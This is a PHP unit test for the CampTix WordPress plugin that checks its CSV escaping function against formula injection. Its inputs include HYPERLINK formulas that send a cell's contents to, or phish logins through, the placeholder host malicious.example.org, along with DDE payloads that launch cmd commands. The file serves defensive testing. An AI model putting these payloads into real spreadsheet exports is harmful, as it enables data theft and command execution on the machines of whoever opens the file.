<?php

defined( 'WPINC' ) or die();

/**
 * @covers CampTix_Plugin
 */
class Test_CampTix_Plugin extends \WP_UnitTestCase {
	/**
	 * @covers CampTix_Plugin::esc_csv
	 */
	public function test_esc_csv() {
		$test_input = array(
			// Safe
			'CampTix',

			// Cells starting with trigger characters
			'=HYPERLINK("http://malicious.example.org/?leak="&A1,"Error: Click here to fix.")',
			'@HYPERLINK("http://malicious.example.org/wp-login.php","Please log back in to your account for more.")',
			"-2+3+cmd|' /C mstsc'!A0",
			"+2+3+cmd|' /C mspaint'!A0",
			";2+3+cmd|' /C calc'!A0",

			// Cells split by delimiters
			"foo ;=cmd|' /C SoundRecorder'!A0",
			"foo\n-2+3+cmd|' /C explorer'!A0",
			"   -2+3+cmd|' /C notepad'!A0",
			" -2+3+cmd|' /C calc'!A0",

			//mb tests
			"漢字はユニコ",
			"-漢字はユニコ ;=æ",
		);

		$expected_output = array(
			// Safe
			'CampTix',

			// Cells starting with trigger character
			'\'=HYPERLINK("http://malicious.example.org/?leak="&A1,"Error: Click here to fix.")',
			'\'@HYPERLINK("http://malicious.example.org/wp-login.php","Please log back in to your account for more.")',
			"'-2+3+cmd|' /C mstsc'!A0",
			"'+2+3+cmd|' /C mspaint'!A0",
			"';2+3+cmd|' /C calc'!A0",

			// Cells split by delimiters
			"foo ;'=cmd|' /C SoundRecorder'!A0",
			"foo\n'-2+3+cmd|' /C explorer'!A0",
			"'   '-2+3+cmd|' /C notepad'!A0",
			"' '-2+3+cmd|' /C calc'!A0",

			//mb_tests
			"漢字はユニコ",
			"'-漢字はユニコ ;'=æ",
		);

		$this->assertEquals( $expected_output, CampTix_Plugin::esc_csv( $test_input ) );
	}
}
